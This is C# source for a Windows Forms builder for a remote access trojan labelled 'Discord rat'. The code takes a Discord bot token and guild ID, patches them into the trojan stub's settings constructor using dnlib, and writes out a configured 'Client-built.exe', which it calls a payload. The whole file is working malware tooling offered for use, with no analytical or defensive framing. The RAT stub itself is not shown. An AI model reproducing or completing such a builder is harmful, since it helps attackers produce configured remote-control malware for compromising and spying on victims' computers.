using dnlib.DotNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string Bottoken = textBox1.Text.Trim();
            string Guildid = textBox2.Text.Trim();

            if (string.IsNullOrEmpty(Bottoken) || string.IsNullOrEmpty(Guildid))
            {
                MessageBox.Show("Please enter both Bot Token and Guild ID!", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            string outpath = Path.Combine(Environment.CurrentDirectory, "Client-built.exe");
            string stub = Path.Combine(Environment.CurrentDirectory, "Release", "Discord rat.exe");

            if (!File.Exists(stub))
            {
                stub = Path.Combine(Environment.CurrentDirectory, "Discord rat.exe");
            }

            if (!File.Exists(stub))
            {
                MessageBox.Show($"Stub binary not found at:\n{stub}\nPlease build or place 'Discord rat.exe' in the release directory.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string FullName = "Discord_rat.settings";
            try
            {
                labelStatus.Text = "Status: Injecting configuration...";
                var Assembly = AssemblyDef.Load(stub);
                var Module = Assembly.ManifestModule;
                if (Module != null)
                {
                    var Settings = Module.GetTypes().FirstOrDefault(type => type.FullName == FullName);
                    if (Settings != null)
                    {
                        var Constructor = Settings.FindMethod(".cctor");
                        if (Constructor != null)
                        {
                            Constructor.Body.Instructions[0].Operand = Bottoken;
                            Constructor.Body.Instructions[2].Operand = Guildid;

                            Assembly.Write(outpath);
                            labelStatus.Text = "Status: Built successfully!";
                            MessageBox.Show("Payload built successfully to:\n" + outpath, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show("Static constructor not found in settings class.", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else
                    {
                        MessageBox.Show("Settings type not found in assembly.", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception b)
            {
                labelStatus.Text = "Status: Build failed!";
                MessageBox.Show("ERROR: " + b.Message, "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
